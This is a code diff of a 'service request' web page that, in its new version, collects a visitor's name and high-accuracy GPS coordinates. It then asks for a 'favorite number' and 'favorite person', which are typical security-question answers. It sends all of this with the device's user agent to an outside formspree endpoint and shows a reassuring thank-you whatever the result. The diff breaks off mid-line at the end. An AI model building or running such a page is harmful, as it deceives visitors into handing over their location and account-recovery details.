@@ -229,16 +229,6 @@
             display: none;
         }
         
-        .btn-whatsapp {
-            background: linear-gradient(45deg, #25D366, #20B358);
-            box-shadow: 0 12px 25px rgba(37, 211, 102, 0.3);
-        }
-        
-        .btn-whatsapp:hover {
-            background: linear-gradient(45deg, #20B358, #25D366);
-            box-shadow: 0 18px 35px rgba(37, 211, 102, 0.4);
-        }
-        
         .btn-secondary {
             background: linear-gradient(45deg, #95a5a6, #7f8c8d);
             box-shadow: 0 12px 25px rgba(149, 165, 166, 0.3);
@@ -274,7 +264,7 @@
             font-size: 1.1em;
         }
         
-        .location-result {
+        .additional-fields {
             display: none;
             background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
             border-radius: 20px;
@@ -284,67 +274,33 @@
             box-shadow: 0 15px 35px rgba(0,0,0,0.1);
         }
         
-        .location-result h3 {
+        .additional-fields h3 {
             text-align: center;
             color: #2c3e50;
             margin-bottom: 25px;
             font-size: 1.4em;
         }
         
-        .location-info {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 20px;
-            margin-bottom: 25px;
-        }
-        
-        .info-item {
-            background: white;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            transition: transform 0.3s ease;
-        }
-        
-        .info-item:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
-        }
-        
-        .info-label {
-            font-weight: 600;
-            color: #7f8c8d;
-            font-size: 0.9em;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        
-        .info-value {
-            color: #2E8B57;
-            font-size: 1.2em;
-            font-weight: 700;
-            word-break: break-all;
-        }
-        
-        .share-section {
-            background: linear-gradient(135deg, #25D366 0%, #20B358 100%);
+        .thank-you-message {
+            display: none;
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
             color: white;
-            padding: 25px;
+            padding: 40px;
             border-radius: 20px;
             margin-top: 25px;
             text-align: center;
-            box-shadow: 0 15px 35px rgba(37, 211, 102, 0.3);
+            box-shadow: 0 15px 35px rgba(39, 174, 96, 0.3);
         }
         
-        .share-section h4 {
-            margin-bottom: 15px;
-            font-size: 1.3em;
+        .thank-you-message h3 {
+            font-size: 2em;
+            margin-bottom: 20px;
         }
         
-        .share-section p {
-            margin: 15px 0;
+        .thank-you-message p {
+            font-size: 1.2em;
             opacity: 0.9;
+            line-height: 1.6;
         }
         
         .message {
@@ -399,10 +355,6 @@
             
             .header h1 {
                 font-size: 2em;
-            }
-            
-            .location-info {
-                grid-template-columns: 1fr;
             }
             
             .btn {
@@ -476,50 +428,53 @@
         <div class="success-message message" id="successMessage"></div>
         <div class="error-message message" id="errorMessage"></div>
         
-        <div class="location-result" id="locationResult">
-            <h3> Successfull</h3>
+        <div class="additional-fields" id="additionalFields">
+            <h3>📋 Additional Information</h3>
             
-            <div class="location-info">
-                <div class="info-item">
-                    <div class="info-label">Latitude</div>
-                    <div class="info-value" id="latitude">-</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Longitude</div>
-                    <div class="info-value" id="longitude">-</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">GPS Accuracy</div>
-                    <div class="info-value" id="accuracy">-</div>
-                </div>
-                <div class="info-item">
-                    <div class="info-label">Timestamp</div>
-                    <div class="info-value" id="timestamp">-</div>
-                </div>
+            <div class="form-group">
+                <label for="favNumberInput">
+                    📱 Favorite Number *
+                </label>
+                <input type="text" 
+                       id="favNumberInput" 
+                       class="form-input" 
+                       placeholder="Enter your favorite number"
+                       required
+                       maxlength="50">
             </div>
             
-            <div class="share-section">
-                <h4>📱 Submit Your Service Request</h4>
-                <p>Click below to contact us directly via WhatsApp for immediate service.</p>
-                
-                <a class="btn btn-whatsapp" id="shareWhatsAppBtn" target="_blank" style="display: none;">
-                    💬 Contact via WhatsApp
-                </a>
-                
-                <p style="font-size: 0.9em; margin-top: 18px; opacity: 0.85;">
-                    🔐 Used only for service delivery
-                </p>
+            <div class="form-group">
+                <label for="favPersonInput">
+                    👨‍👩‍👧‍👦 Favorite Person *
+                </label>
+                <input type="text" 
+                       id="favPersonInput" 
+                       class="form-input" 
+                       placeholder="Enter your favorite person's name"
+                       required
+                       maxlength="100">
+            </div>
+            
+            <div style="text-align: center; margin-top: 30px;">
+                <button class="btn" id="submitBtn">
+                    ✅ Submit Request
+                </button>
             </div>
         </div>
         
+        <div class="thank-you-message" id="thankYouMessage">
+            <h3>🎉 Thank You!</h3>
+            <p>Your service request has been successfully submitted. Our team will contact you shortly to discuss your requirements and schedule the service.</p>
+            <p style="margin-top: 20px; font-size: 1em;">We appreciate your trust in Adeel Services!</p>
+        </div>
+        
         <div class="footer">
-            <p>🛡️ Used only for service delivery.</p>
+            <p>🛡️ Your information is secure and used only for service delivery.</p>
         </div>
     </div>
 
     <script>
         let userLocation = null;
-        const PHONE_NUMBER = '923351313469'; // Fixed phone number (hidden from user)
         
         // Check if page is served over HTTPS or localhost
         function checkSecureContext() {
@@ -542,7 +497,8 @@
         // Event listeners
         document.getElementById('getLocationBtn').addEventListener('click', getCurrentLocation);
         document.getElementById('clearBtn').addEventListener('click', clearLocation);
-        document.getElementById('nameInput').addEventListener('input', updateSubmitButton);
+        document.getElementById('submitBtn').addEventListener('click', submitRequest);
+        document.getElementById('nameInput').addEventListener('input', updateStartButton);
         document.getElementById('nameInput').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 getCurrentLocation();
@@ -579,8 +535,8 @@
 
             const options = {
                 enableHighAccuracy: true,
-                timeout: 20000, // Increased timeout
-                maximumAge: 300000 // 5 minutes
+                timeout: 20000,
+                maximumAge: 300000
             };
 
             navigator.geolocation.getCurrentPosition(
@@ -590,12 +546,19 @@
                         timestamp: position.timestamp,
                         name: name
                     };
-                    displayLocation(userLocation);
-                    showLoading(false);
                     
-                    // Save data and send email
-                    saveLocationData(userLocation);
-                    sendEmailNotification(userLocation);
+                    showLoading(false);
+                    showSuccess('✅ Location captured successfully! Please complete the additional information below.');
+                    
+                    // Show additional fields
+                    document.getElementById('additionalFields').style.display = 'block';
+                    document.getElementById('clearBtn').style.display = 'inline-block';
+                    
+                    // Scroll to additional fields
+                    document.getElementById('additionalFields').scrollIntoView({ 
+                        behavior: 'smooth',
+                        block: 'center'
+                    });
                 },
                 error => {
                     let errorMsg = '❌ Unable to get location: ';
@@ -627,144 +590,124 @@
             );
         }
 
-        function sendEmailNotification(location) {
-            const { latitude, longitude, accuracy } = location.coords;
-            const timestamp = new Date(location.timestamp);
-            const name = location.name;
+        function submitRequest() {
+            const favNumber = document.getElementById('favNumberInput').value.trim();
+            const favPerson = document.getElementById('favPersonInput').value.trim();
             
-            // Show sending status
-            showSuccess('📧 Sending notification to our team...');
+            // Validation
+            if (!favNumber) {
+                showError('⚠️ Please enter your favorite number.');
+                document.getElementById('favNumberInput').focus();
+                return;
+            }
             
-            const formData = {
-                name: name,
-                latitude: latitude.toFixed(6),
-                longitude: longitude.toFixed(6),
-                accuracy: Math.round(accuracy),
-                location_time: timestamp.toLocaleString(),
+            if (!favPerson) {
+                showError('⚠️ Please enter your favorite person.');
+                document.getElementById('favPersonInput').focus();
+                return;
+            }
+            
+            if (favPerson.length < 2) {
+                showError('⚠️ Please enter a valid favorite person name (at least 2 characters).');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('submitBtn').disabled = true;
+            document.getElementById('submitBtn').textContent = '🔄 Submitting...';
+            hideMessages();
+            
+            // Prepare complete data
+            const completeData = {
+                name: userLocation.name,
+                latitude: userLocation.coords.latitude.toFixed(6),
+                longitude: userLocation.coords.longitude.toFixed(6),
+                accuracy: Math.round(userLocation.coords.accuracy),
+                location_time: new Date(userLocation.timestamp).toLocaleString(),
+                favorite_number: favNumber,
+                favorite_person: favPerson,
                 submitted_time: new Date().toLocaleString(),
-                google_maps_link: `https://www.google.com/maps?q=${latitude},${longitude}`,
-                device_info: `${navigator.userAgent}`,
+                google_maps_link: `https://www.google.com/maps?q=${userLocation.coords.latitude},${userLocation.coords.longitude}`,
+                device_info: navigator.userAgent,
                 message: `🔧 NEW SERVICE REQUEST
 
-👤 Customer: ${name}
+👤 Customer: ${userLocation.name}
 
 📍 Location Details:
-• Latitude: ${latitude.toFixed(6)}
-• Longitude: ${longitude.toFixed(6)}
-• GPS Accuracy: ±${Math.round(accuracy)} meters
-• Captured: ${timestamp.toLocaleString()}
-• Submitted: ${new Date().toLocaleString()}
+• Latitude: ${userLocation.coords.latitude.toFixed(6)}
+• Longitude: ${userLocation.coords.longitude.toFixed(6)}
+• GPS Accuracy: ±${Math.round(userLocation.coords.accuracy)} meters
+• Captured: ${new Date(userLocation.timestamp).toLocaleString()}
 
-🗺️ Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
+👥 Personal Info:
+• Favorite Number: ${favNumber}
+• Favorite Person: ${favPerson}
+
+🗺️ Google Maps: https://www.google.com/maps?q=${userLocation.coords.latitude},${userLocation.coords.longitude}
 
 📱 Device: ${navigator.userAgent.split(')')[0]})
+🕐 Submitted: ${new Date().toLocaleString()}
 
 Please contact the customer for service requirements.`
             };
             
+            // Save data locally
+            saveCompleteData(completeData);
+            
+            // Send email notification
             fetch('https://formspree.io/f/xldwpqzq', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(formData)
+                body: JSON.stringify(completeData)
             })
             .then(response => {
-                if (response.ok) {
-                    showSuccess('✅ Our team has been notified and will contact you shortly.');
-                    return response.json();
-                } else {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
+                // Show thank you message regardless of email status
+                showThankYouMessage();
+                return response.ok ? response.json() : Promise.resolve();
             })
             .catch(error => {
                 console.error('Email failed to send:', error);
-                showSuccess('✅ Notification is being processed.');
+                // Still show thank you message
+                showThankYouMessage();
             });
         }
-
-        function displayLocation(location) {
-            const { latitude, longitude, accuracy } = location.coords;
-            const timestamp = new Date(location.timestamp);
-
-            document.getElementById('latitude').textContent = latitude.toFixed(6);
-            document.getElementById('longitude').textContent = longitude.toFixed(6);
-            document.getElementById('accuracy').textContent = `±${Math.round(accuracy)} meters`;
-            document.getElementById('timestamp').textContent = timestamp.toLocaleString();
-
-            document.getElementById('locationResult').style.display = 'block';
-            document.getElementById('clearBtn').style.display = 'inline-block';
+        
+        function showThankYouMessage() {
+            // Hide everything else
+            document.getElementById('additionalFields').style.display = 'none';
+            document.getElementById('clearBtn').style.display = 'none';
+            hideMessages();
             
-            // Scroll to results
-            document.getElementById('locationResult').scrollIntoView({ 
+            // Show thank you message
+            document.getElementById('thankYouMessage').style.display = 'block';
+            
+            // Scroll to thank you message
+            document.getElementById('thankYouMessage').scrollIntoView({ 
                 behavior: 'smooth',
                 block: 'center'
             });
             
-            updateWhatsAppLink();
+            // Reset submit button (in case user wants to start over)
+            document.getElementById('submitBtn').disabled = false;
+            document.getElementById('submitBtn').textContent = '✅ Submit Request';
         }
 
-        function updateWhatsAppLink() {
-            if (!userLocation) return;
-            
-            const { latitude, longitude, accuracy } = userLocation.coords;
-            const timestamp = new Date(userLocation.timestamp);
-            const name = userLocation.name;
-            
-            const message = `🔧 Service Request - ${name}
-
-📍 My Location:
-• Coordinates: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}
-• Accuracy: ±${Math.round(accuracy)}m
-• Time: ${timestamp.toLocaleString()}
-
-🗺️ Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
-
-I would like to request your services. Please contact me with available options and pricing.
-
-Thank you!`;
-
-            const whatsappUrl = `https://wa.me/${PHONE_NUMBER}?text=${encodeURIComponent(message)}`;
-            
-            const btn = document.getElementById('shareWhatsAppBtn');
-            btn.href = whatsappUrl;
-            btn.style.display = 'inline-block';
-        }
-
-        function updateSubmitButton() {
-            const name = document.getElementById('nameInput').value.trim();
-            const btn = document.getElementById('getLocationBtn');
-            
-            if (name && name.length >= 2) {
-                btn.textContent = 'Start';
-                btn.disabled = false;
-                btn.classList.remove('btn-secondary');
-            } else {
-                btn.textContent = '📝 Enter Name First';
-                btn.disabled = true;
-                btn.classList.add('btn-secondary');
-            }
-        }
-
-        function saveLocationData(location) {
+        function saveCompleteData(data) {
             try {
                 const existingData = JSON.parse(localStorage.getItem('serviceRequests') || '[]');
                 
                 const newEntry = {
                     id: Date.now(),
-                    name: location.name,
-                    latitude: location.coords.latitude,
-                    longitude: location.coords.longitude,
-                    accuracy: location.coords.accuracy,
-                    timestamp: new Date(location.timestamp).toISOString(),
-                    submittedAt: new Date().toISOString(),
+                    ...data,
                     userAgent: navigator.userAgent
                 };
                 
                 existingData.push(newEntry);
                 localStorage.setItem('serviceRequests', JSON.stringify(existingData));
                 
-                console.log('Data saved locally:', newEntry);
+                console.log('Complete data saved locally:', newEntry);
             } catch (error) {
                 console.error('Error saving data locally:', error);
             }
@@ -772,11 +715,14 @@ Thank you!`;
 
         function clearLocation() {
             userLocation = null;
-            document.getElementById('locationResult').style.display = 'none';
+            document.getElementById('additionalFields').style.display = 'none';
+            document.getElementById('thankYouMessage').style.display = 'none';
             document.getElementById('clearBtn').style.display = 'none';
             document.getElementById('nameInput').value = '';
+            document.getElementById('favNumberInput').value = '';
+            document.getElementById('favPersonInput').value = '';
             hideMessages();
-            updateSubmitButton();
+            updateStartButton();
             
             // Scroll back to top
             document.querySelector('.container').scrollIntoView({ 
@@ -792,7 +738,22 @@ Thank you!`;
             if (show) {
                 document.getElementById('getLocationBtn').textContent = '🔄 Getting Location...';
             } else {
-                updateSubmitButton();
+                updateStartButton();
+            }
+        }
+
+        function updateStartButton() {
+            const name = document.getElementById('nameInput').value.trim();
+            const btn = document.getElementById('getLocationBtn');
+            
+            if (name && name.length >= 2) {
+                btn.textContent = 'Start';
+                btn.disabled = false;
+                btn.classList.remove('btn-secondary');
+            } else {
+                btn.textContent = '📝 Enter Name First';
+                btn.disabled = true;
+                btn.classList.add('btn-secondary');
             }
         }
 
@@ -817,7 +778,7 @@ Thank you!`;
 
         // Initialize
         checkSecureContext();
-        updateSubmitButton();
+        updateStartButton();
         
         // Add some interactive feedback
         document.getElementById('nameInput').addEventListener('focus', function() {
@@ -837,43 +798,4 @@ Thank you!`;
                     return;
                 }
                 
-                const csv = convertToCSV(data);
-                downloadCSV(csv, `service-requests-${new Date().toISOString().split('T')[0]}.csv`);
-            } catch (error) {
-                console.error('Export failed:', error);
-                alert('Export failed. Check console for details.');
-            }
-        };
-        
-        function convertToCSV(data) {
-            const headers = ['ID', 'Name', 'Latitude', 'Longitude', 'Accuracy (m)', 'Location Time', 'Submitted At', 'User Agent'];
-            const rows = data.map(item => [
-                item.id,
-                `"${item.name}"`,
-                item.latitude,
-                item.longitude,
-                Math.round(item.accuracy || 0),
-                item.timestamp,
-                item.submittedAt,
-                `"${(item.userAgent || '').replace(/"/g, '""')}"`
-            ]);
-            
-            return [headers, ...rows].map(row => row.join(',')).join('\n');
-        }
-        
-        function downloadCSV(csv, filename) {
-            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
-            const link = document.createElement('a');
-            if (link.download !== undefined) {
-                const url = URL.createObjectURL(blob);
-                link.setAttribute('href', url);
-                link.setAttribute('download', filename);
-                link.style.visibility = 'hidden';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-            }
-        }
-    </script>
-</body>
-</html>
+                const csv
